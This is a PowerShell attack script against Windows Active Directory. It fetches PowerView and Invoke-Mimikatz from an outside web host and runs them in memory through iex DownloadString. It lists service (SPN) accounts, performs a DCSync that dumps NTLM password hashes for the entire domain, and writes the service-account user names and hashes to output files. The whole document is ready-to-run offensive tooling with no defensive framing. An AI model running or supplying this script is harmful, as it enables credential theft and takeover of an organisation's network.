# CHECK WRITE PERMISSIONS ON CURRENT DIR
Try { [io.file]::OpenWrite('justatestfile.txt').close() }
Catch { Write-Warning "Unable to write to output file. Please change directory!"; break}

# LOAD POWERVIEW INTO MEMORY
iex(new-Object Net.WebClient).DownloadString('https://lrvt.de/dl/PowerView.ps1');Get-NetDomain;

# LOAD MIMIKATZ INTO MEMORY
iex(new-Object Net.WebClient).DownloadString('https://lrvt.de/dl/Invoke-Mimikatz.ps1')

# GET SPN SAMACCOUTNAMES ONLY & LOG RESULTS
Get-DomainUser -SPN > spnuser_fulldetails.txt
Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname } > spnuser_samaccountname.txt

# DO FULL DCSYNC OVER FULL DOMAIN & LOG RESULTS
$DATE = $(get-date -f yyyyMMddThhmm)
$LOG = $DATE + "_" + "DCSync_NTLM_full.txt"
$LOGSPN = $DATE + "_" + "DCSYNC_SPN_NTHASH.txt"
$LOGFIN = $DATE + "_" + "DCSync_NTLM_UserHash_FINAL.txt"
$DOMAIN = get-netdomain | Select-Object -property Name | foreach { $_.Name}

write-host "[!!!] DCSync will be executed on" $DOMAIN -ForegroundColor Red

$command = '"log ' + $LOG + '" "lsadump::dcsync /domain:'+ $DOMAIN +' /all /csv"'
Invoke-Mimikatz -Command $command

# GET SPN USERS ONLY AS LOOP VAR
$loop = Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname }

# LOOP OVER DCSYNC FULL AND FILTER FOR SPN USER & LOG RESULTS
foreach ($spn in $loop) {
get-content $LOG -ReadCount 1000 |
    foreach { $_ -match $spn } >> $LOGSPN
}

# GET NT-HASHES ONLY
$HASHES = $DATE + "_" + "SPN_Hashes_Only_FINAL.txt"
(Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES

# GET USERS ONLY
$USERS = $DATE + "_" + "SPN_Users_Only_FINAL.txt"
(Get-Content -LiteralPath $LOGSPN) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS

# CONCAT USER AND NT-HASH INTO OUTFILE
$File1 = Get-Content $USERS
$File2 = Get-Content $HASHES
for($i = 0; $i -lt $File1.Count; $i++)
{
    ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $LOGFIN
}

# VERIFY AMOUNT OF SPN AND DSYNCED SPNS
write-host "Found SPNs:" (Get-Content "spnuser_samaccountname.txt" | Select-Object -property samaccountname | foreach { $_.samaccountname }).Length "(minus 1 for Guest account)" -ForegroundColor Red; write-host "DCsynced SPNs:" (Get-Content $LOGSPN).Length -ForegroundColor Red
